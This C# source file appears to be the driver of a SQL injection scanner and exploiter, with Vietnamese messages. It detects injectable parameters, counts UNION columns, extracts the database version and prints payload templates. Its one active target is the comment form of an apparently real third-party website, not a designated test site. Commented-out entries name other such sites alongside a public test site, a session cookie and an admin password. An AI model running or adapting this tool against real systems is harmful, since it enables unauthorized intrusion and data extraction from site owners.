using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using SQLiScanner.Models;
using SQLiScanner.Modules;
using SQLiScanner.Utility;
using Spectre.Console;
using SQLiScanner.Models.Enums;
using System.Collections.Concurrent;
using System.Threading.Tasks.Sources;

namespace SQLiScanner
{
    public class ScannerApp
    {
        private readonly Crawler _crawler;
        private readonly DatabaseDetector _dbDetector;
        private readonly UnionDetector _unionDetector;
        private readonly AiConcurrencyEngine _aiEngine;
        private readonly ExploitationEngine _exploitationEngine;

        // Thuộc tính dành cho việc phân tích
        
        public ScannerApp(
            Crawler crawler,
            DatabaseDetector dbDetector,
            UnionDetector unionDetector,
            AiConcurrencyEngine aiEngine,
            ExploitationEngine exploitationEngine)
        {
            _crawler = crawler;
            _dbDetector = dbDetector;
            _unionDetector = unionDetector;
            _aiEngine = aiEngine;
            _exploitationEngine = exploitationEngine;
        }

        public async Task RunAsync()
        {
            
            var (url, maxDepth) = GetUserInput();
            if (string.IsNullOrEmpty(url)) return;

            bool isEarlyExit = AnsiConsole.Confirm("Bạn có muốn dừng ngay khi tìm thấy lỗi đầu tiên (Early Exit)?", defaultValue: true);
            var scanConfig = new ScanConfig(isEarlyExit);
            Console.CancelKeyPress += (sender, e) =>
            {
                AnsiConsole.MarkupLine("\n[bold red][!] Nhận lệnh hủy từ người dùng. Đang dừng các luồng an toàn...[/]");
                scanConfig.Cts.Cancel();
                e.Cancel = true;
            };
            AnsiConsole.MarkupLine($"[bold blue][/] Đang bắt đầu quét tại: [underline]{url}[/] (Độ sâu: {maxDepth})");

            //Crawler tìm mục tiêu
            //List<CrawlResult> targets = await _crawler.CrawlAsync(url, maxDepth);
            //if (targets.Count == 0)
            //{
            //    Console.WriteLine("[-] Không tìm thấy URL tiềm năng.");
            //    return;
            //}

            List<CrawlResult> targetsDemo = new()
            {
                //new()
                //{
                //    BaseUrl = "http://testasp.vulnweb.com/Login.asp",
                //    HttpMethod = "GET",
                //    IsForm = false,
                //    Params = new()
                //    {
                //        { "RetURL", "/Default.asp?" }
                //    },
                //    RawQueryString = "RetURL=%2FDefault.asp%3F"
                //},

                //new()
                //{
                //    BaseUrl = "http://testasp.vulnweb.com/showforum.asp",
                //    HttpMethod = "GET",
                //    IsForm = false,
                //    OriginalCookie = "ASPSESSIONIDACDRSBTA=HMBDEPLCJFJGJJMNEMHIFKME",
                //    PageTolerance = 0.05,
                //    Params = new()
                //    {
                //        { "id", "0" }
                //    },
                //    RawQueryString = "id=0"
                //},

                //new()
                //{
                //    BaseUrl = "http://testasp.vulnweb.com/Register.asp",
                //    HttpMethod = "GET",
                //    IsForm = false,
                //    Params = new()
                //    {
                //        { "RetURL", "/Default.asp?" }
                //    },
                //    RawQueryString = "RetURL=%2FDefault.asp%3F"
                //},
                //new()
                //{
                //    BaseUrl = "http://testasp.vulnweb.com/Login.asp",
                //    HttpMethod = "POST",
                //    IsForm = true,
                //    Params = new()
                //    {
                //        { "tfUName", "admin" },
                //        { "tfUPass", "Admin@123"}
                //    },
                //    RawQueryString = "RetURL=%2FDefault.asp%3F"
                //},

                //new()
                //{
                //    BaseUrl = "http://testasp.vulnweb.com/showforum.asp",
                //    HttpMethod = "GET",
                //    IsForm = false,
                //    Params = new()
                //    {
                //        { "id", "0" }
                //    },
                //    RawQueryString = "id=0"
                //},

                //new()
                //{
                //    BaseUrl = "https://gamdie.com/",
                //    HttpMethod = "GET",
                //    IsForm = true,
                //    OriginalCookie = "",
                //    Params = new()
                //    {
                //        { "s", "TEST" }
                //    },
                //    RawQueryString = "s=TEST"
                //},

                //new()
                //{
                //    BaseUrl = "https://www.ovagames.com/",
                //    HttpMethod = "GET",
                //    IsForm = true,
                //    OriginalCookie = "",
                //    Params = new()
                //    {
                //        { "s", "TEST" }
                //    },
                //    RawQueryString = "s=TEST"
                //},

                new()
                {
                    BaseUrl = "https://www.ovagames.com/wp-comments-post.php",
                    HttpMethod = "POST",
                    IsForm = true,
                    OriginalCookie = "",
                    PageTolerance = 0.05,
                    Params = new()
                    {
                        { "bde9744e33", "TEST" },
                        { "comment", "TEST" },
                        { "author", "TEST" },
                        { "email", "test@test.com" },
                        { "url", "http://test.com" },
                        { "comment_post_ID", "167048" },
                        { "comment_parent", "0" },
                    },
                    RawQueryString = ""
                },
            };
            Console.WriteLine();
            // Bắt đầu cho chạy chờ đọc request từ luồng chính nếu cần AI phân tích
            _aiEngine.StartWorkers();

            var vulnerableTargets = new List<(CrawlResult Target, AnalyzingResult Result)>();
            AnsiConsole.MarkupLine("\n[bold yellow]--- BẮT ĐẦU GIAI ĐOẠN PHÂN TÍCH ---[/]");
            foreach (var target in targetsDemo)
            {
                if (scanConfig.Token.IsCancellationRequested) break;

                var currentTargetVulns = new List<(CrawlResult Target, AnalyzingResult Result, List<int> VisibleCols)>();

                await AnsiConsole.Status()
                .Spinner(Spinner.Known.BouncingBar)
                .SpinnerStyle(Style.Parse("green"))
                .StartAsync("[dim]Đang khởi tạo trình quét...[/]", async console =>
                {
                    scanConfig.OnProgress = (string msg) =>
                    {
                        console.Status($"[blue][[{Markup.Escape(target.FullUrl)}]][/] [dim]{Markup.Escape(msg)}[/]");
                    };

                    await _dbDetector.DetectAsync(target, scanConfig);

                    List<AnalyzingResult> targetResults = scanConfig.DetectionResults
                        .Where(r => r.VulnerableURL == target.FullUrl
                                    && r.HttpMethod == target.HttpMethod
                                    && !r.VulnTypes.HasFlag(VulnerabilityType.UnionBased)).ToList();


                    foreach (var result in targetResults)
                    {
                        // Kiểm tra khả năng khai thác bằng kĩ thuật Union
                        if (scanConfig.Token.IsCancellationRequested) return;

                        List<int> visibleCols = new List<int>();

                        if (result.IsAbleToUnionExploit && !result.VulnTypes.HasFlag(VulnerabilityType.XSS))
                        {
                            int colCount = await _unionDetector.GetColumnCountAsync(target, result, scanConfig);
                            if (colCount > 0)
                            {
                                visibleCols = await _unionDetector.GetVisibleColumnsAsync(target, result, colCount, scanConfig);
                                if (visibleCols.Count > 0)
                                {
                                    result.VulnTypes |= VulnerabilityType.UnionBased;
                                    result.ColumnCount = colCount;
                                    result.EchoColumns = visibleCols;
                                }
                            }
                        }

                        currentTargetVulns.Add((target, result, visibleCols));
                        vulnerableTargets.Add((target, result));
                    }
                });

                foreach (var vulnTarget in currentTargetVulns)
                {
                    PrintVulnerableTree(target, vulnTarget.Result, vulnTarget.VisibleCols);
                }
            }

            await _aiEngine.StopAndWaitAsync();

            if (vulnerableTargets.Count > 0 && !scanConfig.Token.IsCancellationRequested)
            {
                AnsiConsole.MarkupLine("\n[bold yellow]--- BẮT ĐẦU GIAI ĐOẠN KHAI THÁC DỮ LIỆU ---[/]");
                foreach (var (vulnTarget, vulnResult) in vulnerableTargets)
                {
                    if (vulnResult.IsXSS) continue;
                    if (scanConfig.Token.IsCancellationRequested) break;

                    ExploitationResult? exploitationResult = null;

                    await AnsiConsole.Status()
                        .Spinner(Spinner.Known.BouncingBar)
                        .SpinnerStyle(Style.Parse("green"))
                        .StartAsync($"[blue][[{Markup.Escape(vulnTarget.FullUrl)}]][/] [dim]Đang khởi tạo khai thác...[/]", async console =>
                        {
                            Action<string> onProgress = (message) =>
                            {
                                console.Status($"[blue][[{Markup.Escape(vulnTarget.FullUrl)}]][/][[{vulnTarget.HttpMethod}]]: [dim]{Markup.Escape(message)}[/]");
                            };

                            exploitationResult = await _exploitationEngine.ExtractDataAsync(
                                vulnTarget,
                                vulnResult,
                                "version",
                                onProgress,
                                scanConfig.Token
                            );
                        });

                    if (exploitationResult != null && exploitationResult.IsSuccess)
                    {
                        // In kết quả trích xuất an toàn đã được làm mờ (Masked)
                        AnsiConsole.MarkupLine($"[blue][[{Markup.Escape(vulnTarget.FullUrl)}]][/] [bold green]Thành công trích xuất: {Markup.Escape(exploitationResult.ExtractedDataMasked)}[/]");
                        vulnResult.IsExploitable = true;
                    }
                    else if (exploitationResult != null)
                    {
                        // In kết quả lỗi mờ tránh gây rách màn hình console
                        AnsiConsole.MarkupLine($"[blue][[{Markup.Escape(vulnTarget.FullUrl)}]][/] [grey]Thất bại[/]");
                    }
                }
            }

            var finalResults = scanConfig.DetectionResults.ToList();

            if (scanConfig.Token.IsCancellationRequested)
            {
                AnsiConsole.MarkupLine("[bold yellow] Quá trình quét đã bị hủy giữa chừng![/]");
            }

            if (finalResults.Count > 0)
            {
                AnsiConsole.MarkupLine("\n[bold green] QUÁ TRÌNH QUÉT KẾT THÚC. PHÁT HIỆN LỖ HỔNG![/]");
            }
            else
            {
                AnsiConsole.MarkupLine("\n[bold grey]Hoàn thành quét. Không phát hiện lỗ hổng có thể khai thác.[/]");
            }

            Console.ReadLine();
        }

        private void PrintVulnerableTree(CrawlResult target, AnalyzingResult result, List<int>? visibleCols)
        {
            var root = new Tree($"[red blink bold]VULNERABLE[/] [blue][[{Markup.Escape(target.FullUrl)}]][/]");

            root.AddNode($"[yellow]Giao thức[/] : [white]{result.HttpMethod}[/]");
            root.AddNode($"[yellow]Kỹ thuật[/] : [white]{result.VulnTypes}[/]");
            root.AddNode($"[yellow]Tham số gây lỗi[/] : [white]{result.VulnerableParam}[/]");
            root.AddNode($"[yellow]Boundary[/] : Tiền tố: [green]{Markup.Escape(result.WorkingPrefix ?? "None")}[/] | Hậu tố: [green]{Markup.Escape(result.WorkingSuffix ?? "None")}[/]");
            root.AddNode($"[yellow]Database[/] : [white]{result.DatabaseType}[/]");
            string examplePayload = $"{result.Route.OriginalValue}{result.WorkingPrefix} AND (CONDITION) {result.WorkingSuffix}";
            root.AddNode($"[yellow]Payload mẫu[/]: [dim]{Markup.Escape(examplePayload)}[/]");

            if (result.VulnTypes.HasFlag(VulnerabilityType.UnionBased) && visibleCols != null && visibleCols.Count > 0)
            {
                var unionNode = root.AddNode("[bold green]Union Ready[/]");

                unionNode.AddNode($"Số cột: [bold white]{result.EchoColumns.Count}[/]");
                unionNode.AddNode($"Cột Echo: [bold white][{string.Join(", ", visibleCols)}][/]");
                unionNode.AddNode($"Payload: [dim]UNION ALL SELECT ...[/]");
            }

            AnsiConsole.Write(root);
            AnsiConsole.WriteLine();
        }

        private (string? url, int depth) GetUserInput()
        {
            Console.Write("Nhập địa chỉ URL: ");
            string? url = Console.ReadLine();
            Console.Write("Nhập độ sâu (0=vô hạn, default=1): ");
            string? depthStr = Console.ReadLine();

            int depth = depthStr switch
            {
                "0" or "all" or "full" => int.MaxValue,
                _ => int.TryParse(depthStr, out int d) ? d : 1
            };

            return (url, depth);
        }
    }
}